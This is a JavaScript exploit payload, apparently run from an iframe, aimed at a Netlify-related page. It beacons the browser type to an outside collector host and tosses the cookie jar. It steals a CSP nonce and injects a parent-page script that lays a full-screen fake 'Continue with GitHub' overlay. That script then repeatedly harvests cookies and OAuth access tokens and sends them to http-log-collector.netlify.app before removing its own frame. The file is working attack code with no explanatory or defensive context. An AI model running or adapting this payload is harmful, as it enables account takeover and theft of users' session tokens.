(() => {
  // --- browser detect + confirm the callback ran (stage 1 beacon) ---
  var UA = navigator.userAgent;
  var isFF = /Firefox\//.test(UA);
  var isCr = !isFF && /Chrome\//.test(UA);
  var b = isFF ? "firefox" : isCr ? "chrome" : "other";
  try { new Image().src = "https://http-log-collector.netlify.app/api/log?stage1=" + b + "&ua=" + encodeURIComponent(UA.slice(0, 60)); } catch (e) {}

  // --- cookie toss ---
  for (let i = 0, p = -1; i < 400; i++) {
    document.cookie = "junk" + i + "=" + "A".repeat(32) + "; Path=/";
    let v = document.cookie.split(/; */).length;
    if (v === p) break; p = v;
  }

  // --- nonce steal ---
  const d = parent.document;
  let n = "";
  try { n = d.querySelector("script[nonce]").nonce; } catch (e) {}
  if (!n) for (const s of d.scripts) if (s.nonce) { n = s.nonce; break; }

  // --- inject parent worker (browser-aware) ---
  const sc = d.createElement("script");
  if (n) sc.nonce = n;
  sc.textContent = `(function(){
    if (window.__gc) return; window.__gc = 1;
    var done = {};
    var isFF = /Firefox\\//.test(navigator.userAgent);
    var isCr = !isFF && /Chrome\\//.test(navigator.userAgent);
    var b = isFF ? "firefox" : isCr ? "chrome" : "other";
    function go(k, v) { try { new Image().src = "https://http-log-collector.netlify.app/api/log?" + k + "=" + encodeURIComponent(v); } catch (e) {} }
    go("stage2", b);
    var a = document.createElement("a");
    a.href = "https://api.netlify.com/auth?provider=github&site_id=app.netlify.com&tracking_session_id=afc7d48b-e925-432a-a170-9121236eda09&login=true&entry_point=direct&browser_fingerprint=cbdb5739abc754bdcc16cbd4fb07cd0f&device_fingerprint=bbbac72e6221cf088819fff54ca43b40&redirect=" + encodeURIComponent("https://www.netlify.com/") + "&use_redirect=true";
    a.target = "_blank";
    a.textContent = "Continue with GitHub";
    a.style.cssText = "position:fixed;inset:0;width:100vw;height:100vh;background:#fff;color:#111;font:26px system-ui;display:flex;align-items:center;justify-content:center;z-index:2147483647;text-decoration:none;cursor:pointer";
    document.body.appendChild(a);
    function grab() {
      try {
        var c = document.cookie;
        if (c && !done.c) { done.c = 1; go("c", c); }
        var m = c.match(/_initial_landing_page=([^;]*)/);
        var t = m ? decodeURIComponent(m[1]).match(/access_token=([^&#]+)/) : null;
        if (t && !done.t) { done.t = 1; go("token", t[1]); }
      } catch (e) {}
    }
    if (isCr) { try { if (window.cookieStore) cookieStore.addEventListener("change", function (ev) {
      for (var i = 0; i < ev.changed.length; i++) if (ev.changed[i].name === "_initial_landing_page") { grab(); break; }
    }); } catch (e) {} }
    // focus/visibility instant capture (works on every engine incl. Firefox)
    try { document.addEventListener("visibilitychange", function () { if (document.visibilityState === "visible") grab(); }); } catch (e) {}
    try { window.addEventListener("focus", grab); } catch (e) {}
    setInterval(grab, 2000);
  })();`;
  (d.head || d.documentElement).appendChild(sc);
  sc.remove();

  try {
    d.querySelectorAll(".fk-d-tooltip__trigger,.fk-d-tooltip,.fk-d-tooltip iframe,iframe[aria-hidden=\"true\"]").forEach(e => e.remove());
    if (window.frameElement) window.frameElement.remove();
  } catch (e) {}})();

